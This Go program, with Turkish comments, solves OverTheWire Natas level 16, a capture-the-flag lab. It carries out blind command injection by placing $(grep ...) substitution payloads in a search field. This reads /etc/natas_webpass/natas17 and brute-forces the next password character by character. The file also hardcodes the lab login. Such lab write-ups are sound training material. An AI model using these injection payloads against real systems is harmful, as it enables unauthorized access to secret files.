/**
NATAS 17 ye geçmek için bilmemiz gereken bir kaç şey var
NATAS 16 kaynak kodunu incelediğimizde bir command injection açığı olduğunu fark ediyoruz fakat command injection açığını yaklayabilmek için gerekli olan
base64 karakterler filtrelenmiş(" ` | ...)

command injection un temelinde genelde alt bir komut çalıştırma olduğundan linux komut satırının şu yararından faydalanabiliriz.
http://www.gnu.org/software/bash/manual/bash.html#Command-Substitution
$(command)
yukarıdaki ifadenin asıl amacı şu `$()` içindeki ifadeyi çalıştırmak ve ana komut ile birleştirmek,örneğin:
grep -i a $(echo b) dictionary.txt
komutunu çalıştırdığımızda ilk önce `echo b` çalışır ve çıktısı `a` ile birleştirilir
yani çalışan komut şu olur : grep -i ab dictionary.txt




NATAS 16 için püf nokta şu :
Africans terimini arattığımızda dictionary.txt içinde geçtiği için ekrana çıktı veriyor.
`Africans$(grep a /etc/natas_webpass/natas17)` şeklindeki payload ı gönderirsek sonuç ne olur?
Eğer `/etc/natas_webpass/natas17` içerisinde a geçiyor ise komut şuna evrilir: `Africansa` ve `Africansa` terimi dictionary.txt içinde bulunmadığından bize çıktı vermez


Buradaki atak vektörümüz ise tam olarak yukarıda açıklanan eğer `$(grep {key} /etc/natas_webpass/natas17)Africans` bir sonuç döndürürse
{key} değeri şifre içinde bulunmuyor demektir. Bundan sonrasını brute force ile çözebiliriz.



İşlemleri daha da kolaylaştırmak adına şu komutu girebiliriz:
$(grep -E ^{key}*  /etc/natas_webpass/natas17)Africans
yukarıdaki ifade {key} değeri ile başlayan ve sonu herhangi bir değer olan ifadeleri arar
*/

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

var (
	username = "natas16"
	password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
	url_     = "http://natas16.natas.labs.overthewire.org/index.php"
	chars    = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

func main() {

	password := ""

	for i := 0; i < 30; i++ {
		for _, c := range chars {
			if pentest(`$(grep ^` + password + string(c) + ` /etc/natas_webpass/natas17)Africans`) {
				password += string(c)
				fmt.Println(password)

			}
		}
	}

}

func pentest(payload string) bool {
	client := &http.Client{}
	postData := url.Values{}
	postData.Set("needle", payload)
	req, err := http.NewRequest("POST", url_, strings.NewReader(postData.Encode()))
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", strconv.Itoa(len(postData.Encode())))
	req.SetBasicAuth(username, password)
	if err != nil {
		log.Fatal(err)
	}

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	return !strings.Contains(string(body), "Africans")

}
